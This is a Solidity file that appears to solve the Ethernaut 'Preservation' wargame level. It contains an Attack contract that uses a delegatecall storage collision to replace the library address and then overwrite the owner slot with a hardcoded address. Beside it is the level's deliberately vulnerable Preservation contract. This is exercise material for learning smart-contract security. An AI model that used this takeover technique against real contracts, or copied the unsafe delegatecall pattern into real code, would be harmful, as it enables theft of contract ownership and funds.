// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Preservation 문제 잘 풀긴 했는데 한 번더 풀어야할듯
interface IPre {
    function setFirstTime(uint256 _timestamp) external;
    function setSecondTime(uint256 _timestamp) external;
}

contract Attack {
    IPre target;
    address private target_address;
    address private fake_address;

    constructor(address addr){
        target = IPre(addr);
        target_address = addr;
    }

    function attack() public {
        target.setFirstTime(uint160(address(this)));
    }

    function setTime(uint256 _time) public {
        fake_address = 0x3Cdcfdb6AF3BcAD4316D54FdB006b59B614988Ac;
    }
}


contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}